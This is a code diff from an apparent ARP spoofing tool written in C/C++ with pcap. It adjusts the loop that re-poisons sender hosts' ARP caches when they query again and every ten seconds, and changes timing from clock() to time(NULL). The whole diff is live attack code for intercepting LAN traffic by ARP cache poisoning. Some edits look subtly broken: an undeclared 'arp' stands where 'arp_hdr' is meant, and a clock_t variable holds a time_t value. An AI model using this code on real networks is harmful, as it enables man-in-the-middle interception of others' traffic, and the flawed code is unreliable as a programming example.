@@ -138,7 +138,8 @@ int main(int argc, char* argv[]) {
 	PEthHdr ethernet_hdr;
 	PArpHdr arp_hdr;
 
-	clock_t start_time=clock();
+	time_t start_time = time(NULL);
+
 	while(true){
 		int res = pcap_next_ex(handle, &header, &rcvpacket);
 		printf("rcv packet!\n");
@@ -153,10 +154,9 @@ int main(int argc, char* argv[]) {
 			rcvpacket += sizeof(struct EthHdr);
 			arp_hdr = (PArpHdr)rcvpacket;
 
-			Ip reinfect_sender = Ip(arp_hdr->sip());
 			int i=-1;
 			for(i=0;i<infect_cnt;i++){
-				if(sender_ip[i]==reinfect_sender) break;
+				if(arp->sip()==sender_ip[i]&&arp->tip()==target_ip[i]) break;
 			}
 			if(i!=infect_cnt){
 				if(send_packet_arp(Mac(arp_hdr->smac()),my_mac,Mac(arp_hdr->smac()),arp_hdr->tip(), arp_hdr->sip(),false)==0){
@@ -181,13 +181,13 @@ int main(int argc, char* argv[]) {
 			}
 		}
 
-		clock_t current_time = clock();
-		double elapsed_seconds = (double)(current_time - start_time) / CLOCKS_PER_SEC;
+		clock_t current_time = time(NULL);
+		double elapsed_time = current_time - start_time;
 
-		if(elapsed_seconds >= 10){
+		if(elapsed_time >= 10){
 			int i;
 			for(i=0;i<infect_cnt;i++) send_packet_arp(sender_mac[i],my_mac,sender_mac[i],Ip(target_ip[i]),Ip(sender_ip[i]), false);
-			start_time = clock();
+			start_time = current_time;
 		}
 	}
 
